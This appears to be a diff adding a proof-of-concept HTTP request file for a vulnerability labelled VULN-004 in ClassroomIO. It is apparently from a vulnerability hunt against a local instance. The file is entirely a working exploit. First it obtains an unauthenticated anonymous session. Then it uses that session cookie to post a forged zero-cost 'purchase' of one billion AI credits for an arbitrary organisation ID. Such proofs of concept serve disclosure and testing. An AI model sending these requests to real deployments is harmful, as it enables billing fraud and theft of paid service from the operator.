@@ -1,0 +1,17 @@
+### VULN-004 — Unlimited AI-credit minting (anon session, no signature)
+### Step 1: mint an anonymous session (VULN-018) — unauthenticated
+POST http://localhost:21527/api/auth/sign-in/anonymous HTTP/1.1
+Host: localhost:21527
+Origin: http://localhost:21526
+Content-Type: application/json
+
+{}
+
+### Step 2: forge a Polar "purchase" for ANY org with the anon cookie
+POST http://localhost:21527/agent/credits/purchase HTTP/1.1
+Host: localhost:21527
+Origin: http://localhost:21526
+Cookie: classroomio.session_token=<anon session>
+Content-Type: application/json
+
+{"orgId":"48bbdff8-2ad5-46a3-a259-2ca3d52677dd","providerOrderId":"cvehunt-<random>","tokens":1000000000,"quantity":1,"unitPriceCents":0,"currency":"USD"}
